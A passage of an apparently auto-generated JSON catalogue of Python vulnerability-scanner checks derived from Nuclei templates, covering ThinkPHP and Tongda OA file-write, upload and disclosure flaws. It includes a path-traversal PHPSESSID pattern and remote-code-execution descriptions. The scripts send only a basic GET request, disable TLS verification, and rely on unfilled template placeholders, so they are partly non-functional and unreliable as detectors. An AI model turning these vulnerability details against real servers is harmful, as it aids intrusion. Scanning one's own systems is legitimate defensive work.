        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: thinkphp-509-information-disclosure\nName: ThinkPHP 5.0.9 - Information Disclosure\nSeverity: critical\nDescription: ThinkPHP 5.0.9 includes verbose SQL error message that can reveal sensitive information including database credentials.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_thinkphp_509_information_disclosure:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"thinkphp-509-information-disclosure\"\n    SEVERITY = \"critical\"\n    NAME = \"ThinkPHP 5.0.9 - Information Disclosure\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'SQLSTATE, XPATH syntax error' | status HTTP [500]\"\n\n        # Simple word matcher simulation\n        matchers = ['SQLSTATE, XPATH syntax error']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ThinkPHP 5.0.9 - Information Disclosure\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_thinkphp_509_information_disclosure(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: thinkphp-509-information-disclosure\nName: ThinkPHP 5.0.9 - Information Disclosure\nSeverity: critical\nDescription: ThinkPHP 5.0.9 includes verbose SQL error message that can reveal sensitive information including database credentials.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_thinkphp_509_information_disclosure:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"thinkphp-509-information-disclosure\"\n    SEVERITY = \"critical\"\n    NAME = \"ThinkPHP 5.0.9 - Information Disclosure\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'SQLSTATE, XPATH syntax error' | status HTTP [500]\"\n\n        # Simple word matcher simulation\n        matchers = ['SQLSTATE, XPATH syntax error']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ThinkPHP 5.0.9 - Information Disclosure\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_thinkphp_509_information_disclosure(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "thinkphp",
          "vulhub",
          "sqli",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_thinkphp6_arbitrary_write",
        "name": "ThinkPHP 6.0.0~6.0.1 - Arbitrary File Write",
        "language": "Python",
        "famille": "WebApp",
        "description": "ThinkPHP 6.0.0~6.0.1 is susceptible to remote code execution. An attacker can upload any script file through this vulnerability to realize remote code execution takeover.We inject payload into PHPSESSID. In the buggy version, the payload is url encoded and returned as it is. In the fixed version, the payload is returned as a 32-bit hexadecimal string",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Set-Cookie: PHPSESSID=%2F..%2F..%2F..%2Fpublic%2F{{random_filename}}.php' | DSL: status_2 == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "random_filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: random_filename",
            "default": "{{to_lower(rand_base(11))}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: thinkphp6-arbitrary-write\nName: ThinkPHP 6.0.0~6.0.1 - Arbitrary File Write\nSeverity: critical\nDescription: ThinkPHP 6.0.0~6.0.1 is susceptible to remote code execution. An attacker can upload any script file through this vulnerability to realize remote code execution takeover.We inject payload into PHPSESSID. In the buggy version, the payload is url encoded and returned as it is. In the fixed version, the payload is returned as a 32-bit hexadecimal string\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_thinkphp6_arbitrary_write:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"thinkphp6-arbitrary-write\"\n    SEVERITY = \"critical\"\n    NAME = \"ThinkPHP 6.0.0~6.0.1 - Arbitrary File Write\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Set-Cookie: PHPSESSID=%2F..%2F..%2F..%2Fpublic%2F{{random_filename}}.php' | DSL: status_2 == 200\"\n\n        # Simple word matcher simulation\n        matchers = ['Set-Cookie: PHPSESSID=%2F..%2F..%2F..%2Fpublic%2F{{random_filename}}.php']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ThinkPHP 6.0.0~6.0.1 - Arbitrary File Write\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_thinkphp6_arbitrary_write(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: thinkphp6-arbitrary-write\nName: ThinkPHP 6.0.0~6.0.1 - Arbitrary File Write\nSeverity: critical\nDescription: ThinkPHP 6.0.0~6.0.1 is susceptible to remote code execution. An attacker can upload any script file through this vulnerability to realize remote code execution takeover.We inject payload into PHPSESSID. In the buggy version, the payload is url encoded and returned as it is. In the fixed version, the payload is returned as a 32-bit hexadecimal string\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_thinkphp6_arbitrary_write:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"thinkphp6-arbitrary-write\"\n    SEVERITY = \"critical\"\n    NAME = \"ThinkPHP 6.0.0~6.0.1 - Arbitrary File Write\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Set-Cookie: PHPSESSID=%2F..%2F..%2F..%2Fpublic%2F{{random_filename}}.php' | DSL: status_2 == 200\"\n\n        # Simple word matcher simulation\n        matchers = ['Set-Cookie: PHPSESSID=%2F..%2F..%2F..%2Fpublic%2F{{random_filename}}.php']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ThinkPHP 6.0.0~6.0.1 - Arbitrary File Write\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_thinkphp6_arbitrary_write(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "thinkphp",
          "file-upload",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_tongda_action_uploadfile",
        "name": "Tongda OA v2017 action_upload - Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "Tongda OA v2017 action_upload.php file filtering is insufficient and does not require background permissions, resulting in arbitrary file upload vulnerabilities",
        "severity": "critical",
        "detection": "[AND] mot(s) '{{md5(string)}}' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "tongda-action-uploadfile"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: tongda-action-uploadfile\nName: Tongda OA v2017 action_upload - Arbitrary File Upload\nSeverity: critical\nDescription: Tongda OA v2017 action_upload.php file filtering is insufficient and does not require background permissions, resulting in arbitrary file upload vulnerabilities\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_tongda_action_uploadfile:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"tongda-action-uploadfile\"\n    SEVERITY = \"critical\"\n    NAME = \"Tongda OA v2017 action_upload - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{md5(string)}}' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['{{md5(string)}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Tongda OA v2017 action_upload - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_tongda_action_uploadfile(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
